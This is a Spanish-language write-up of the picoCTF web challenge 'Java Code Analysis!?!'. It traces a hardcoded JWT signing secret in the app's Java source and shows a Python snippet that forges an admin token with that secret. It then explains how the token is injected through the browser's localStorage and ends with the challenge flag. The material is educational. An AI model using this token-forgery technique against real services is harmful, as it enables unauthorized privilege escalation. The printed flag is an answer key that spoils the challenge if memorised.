### [Java Code Analysis!?!](https://play.picoctf.org/practice/challenge/355)

### DESCRIPCIÓN

BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/478/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:63572/).
### SOLUCIÓN

Identificamos que el control de acceso de la aplicación se maneja mediante JSON Web Tokens (JWT). Realizamos un análisis de caja blanca (auditoría de código fuente) para encontrar la clave de firma del servidor.

- Analizamos la clase `JwtService.java` en el paquete `security` y descubrimos que utiliza el algoritmo HMAC256 y obtiene la clave secreta a través de la clase `SecretGenerator.java`.
   
- Al revisar `SecretGenerator.java`, encontramos una vulnerabilidad crítica: la función que genera la clave por defecto (en caso de fallar la lectura del archivo de configuración) devuelve una cadena _hardcodeada_:

```
private String generateRandomString(int len) {
    // not so random
    return "1234";
}
```

- Con la clave secreta (`1234`), fabricamos un nuevo JWT falsificado para escalar privilegios. Modificamos el payload original para cambiar nuestro rol a Administrador y el ID de usuario, quedando así:

```
>>> import jwt
... 
... payload = {
...   "role": "Admin",
...   "iss": "bookshelf",
...   "exp": 1800000000,
...   "iat": 1773096859,
...   "userId": 2,
...   "email": "admin"
... }
... 
... token = jwt.encode(payload, "1234", algorithm="HS256")
... print("\nTU NUEVO TOKEN ES:\n" + token)
... 

TU NUEVO TOKEN ES:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE4MDAwMDAwMDAsImlhdCI6M
```

_Firmamos este payload con la clave secreta `1234` usando un script de Python (o herramientas como jwt.io)._


- Para inyectar el token y evadir la validación visual del frontend, abrimos las Herramientas de Desarrollador del navegador > Almacenamiento Local (Local Storage) y modificamos dos valores clave:

- `auth-token`: Pegamos nuestro nuevo JWT firmado.
   
- `token-payload`: Modificamos el JSON puro para que la interfaz web actualice nuestra vista: `{"role":"Admin","iss":"bookshelf","exp":1773702864,"iat":1773098064,"userId":2,"email":"Admin"}`

- Recargamos la página. El frontend ahora nos reconoce como "Admin", permitiéndonos acceder al libro 'Flag'. Al abrirlo, el servidor valida exitosamente la firma de nuestro JWT falsificado y nos entrega la bandera.

picoCTF{w34k_jwt_n0t_g00d_602ce414}
### NOTAS ADICIONALES


### REFERENCIAS